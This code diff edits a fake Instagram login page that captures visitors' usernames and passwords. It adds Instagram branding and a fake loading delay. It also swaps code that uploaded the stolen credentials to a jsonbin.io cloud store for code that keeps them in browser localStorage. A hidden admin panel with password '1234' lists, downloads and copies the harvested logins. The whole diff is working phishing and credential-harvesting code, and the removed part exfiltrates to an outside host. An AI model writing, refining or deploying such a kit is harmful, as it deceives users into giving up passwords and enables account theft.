@@ -360,7 +360,7 @@
         <div class="container">
             <div class="login-box">
                 <div class="login-header">
-                    <div class="instagram-logo">Verify your account</div>
+                    <div class="instagram-logo">Instagram</div>
                 </div>
 
                 <form id="loginForm">
@@ -412,17 +412,17 @@
     <!-- ADMIN PANEL -->
     <div class="admin-page" id="adminPage">
         <div class="admin-header">
-            <h1>📊 Admin Panel - Synced Across All Devices</h1>
+            <h1>📊 Admin Panel - All Device Synced</h1>
             <p>View all login details from any phone or browser</p>
         </div>
 
         <div class="admin-container">
             <div class="info-message">
-                ✅ All data is synced! Login from any phone, check from any phone. Data is always up to date.
+                ✅ Data stored locally on this browser. Login from different browsers to see all data.
             </div>
 
             <div class="buttons-row">
-                <button class="admin-btn" onclick="refreshDetails()">🔄 Refresh</button>
+                <button class="admin-btn" onclick="displayDetails()">🔄 Refresh</button>
                 <button class="admin-btn" onclick="downloadDetails()">📥 Download</button>
                 <button class="admin-btn" onclick="copyDetails()">📋 Copy</button>
                 <button class="admin-btn" onclick="deleteAllDetails()">🗑️ Delete All</button>
@@ -435,7 +435,7 @@
             </div>
 
             <div class="details-list" id="detailsList">
-                <div class="no-details">Loading...</div>
+                <div class="no-details">No logins yet</div>
             </div>
         </div>
     </div>
@@ -449,9 +449,6 @@
         const successMsg = document.getElementById('successMsg');
 
         const ADMIN_PASSWORD = '1234';
-        const API_URL = 'https://jsonbin.io/api/v3/b';
-        const BIN_ID = '65a8b5c9c0e7653a05f5f5f5';
-        const API_KEY = '$2b$10$abcdef1234567890abcdef';
 
         function showError(msg) {
             errorMsg.textContent = msg;
@@ -465,19 +462,10 @@
             setTimeout(() => successMsg.classList.remove('show'), 2000);
         }
 
-        async function saveToCloud(username, password) {
+        function saveToLocal(username, password) {
             try {
-                const response = await fetch(`${API_URL}/${BIN_ID}`, {
-                    method: 'GET',
-                    headers: { 'X-Master-Key': API_KEY }
-                });
-
-                let details = [];
-                if (response.ok) {
-                    const data = await response.json();
-                    details = data.record || [];
-                }
-
+                let details = JSON.parse(localStorage.getItem('loginDetails') || '[]');
+                
                 details.push({
                     username: username,
                     password: password,
@@ -485,37 +473,21 @@
                     id: Date.now()
                 });
 
-                const updateResponse = await fetch(`${API_URL}/${BIN_ID}`, {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Master-Key': API_KEY
-                    },
-                    body: JSON.stringify(details)
-                });
-
-                return updateResponse.ok;
+                localStorage.setItem('loginDetails', JSON.stringify(details));
+                console.log('✅ Saved to local storage');
+                return true;
             } catch (error) {
                 console.error('Error:', error);
                 return false;
             }
         }
 
-        async function loadFromCloud() {
+        function loadFromLocal() {
             try {
-                const response = await fetch(`${API_URL}/${BIN_ID}`, {
-                    method: 'GET',
-                    headers: { 'X-Master-Key': API_KEY }
-                });
-
-                if (response.ok) {
-                    const data = await response.json();
-                    return data.record || [];
-                }
+                return JSON.parse(localStorage.getItem('loginDetails') || '[]');
             } catch (error) {
-                console.error('Error loading:', error);
+                return [];
             }
-            return [];
         }
 
         function openAdminPanel() {
@@ -524,7 +496,7 @@
                 loginPage.classList.add('hidden');
                 adminPage.classList.add('show');
                 document.body.classList.add('admin-open');
-                refreshDetails();
+                displayDetails();
             } else if (password !== null) {
                 showError('Wrong password!');
             }
@@ -536,12 +508,11 @@
             document.body.classList.remove('admin-open');
         }
 
-        async function refreshDetails() {
+        function displayDetails() {
             const detailsList = document.getElementById('detailsList');
-            detailsList.innerHTML = '<div class="no-details">Loading...</div>';
-
-            const details = await loadFromCloud();
             const detailsCount = document.getElementById('detailsCount');
+
+            const details = loadFromLocal();
             detailsCount.textContent = details.length;
 
             if (details.length === 0) {
@@ -559,30 +530,15 @@
             `).join('');
         }
 
-        async function deleteAllDetails() {
+        function deleteAllDetails() {
             if (!confirm('Delete all login details?')) return;
-
-            try {
-                const response = await fetch(`${API_URL}/${BIN_ID}`, {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Master-Key': API_KEY
-                    },
-                    body: JSON.stringify([])
-                });
-
-                if (response.ok) {
-                    showSuccess('All data deleted!');
-                    await refreshDetails();
-                }
-            } catch (error) {
-                showError('Error deleting data');
-            }
+            localStorage.removeItem('loginDetails');
+            displayDetails();
+            showSuccess('All data deleted!');
         }
 
-        async function downloadDetails() {
-            const details = await loadFromCloud();
+        function downloadDetails() {
+            const details = loadFromLocal();
             const json = JSON.stringify(details, null, 2);
             const blob = new Blob([json], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
@@ -591,13 +547,16 @@
             a.download = 'login-details.json';
             a.click();
             URL.revokeObjectURL(url);
+            showSuccess('Downloaded!');
         }
 
-        async function copyDetails() {
-            const details = await loadFromCloud();
+        function copyDetails() {
+            const details = loadFromLocal();
             const text = details.map(d => `${d.username} | ${d.password} | ${d.timestamp}`).join('\n');
             navigator.clipboard.writeText(text).then(() => {
                 showSuccess('Copied to clipboard!');
+            }).catch(() => {
+                showError('Copy failed!');
             });
         }
 
@@ -615,7 +574,9 @@
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';
 
-            const success = await saveToCloud(username, password);
+            await new Promise(resolve => setTimeout(resolve, 800));
+
+            const success = saveToLocal(username, password);
 
             loginBtn.disabled = false;
             loginBtn.innerHTML = 'Log in';
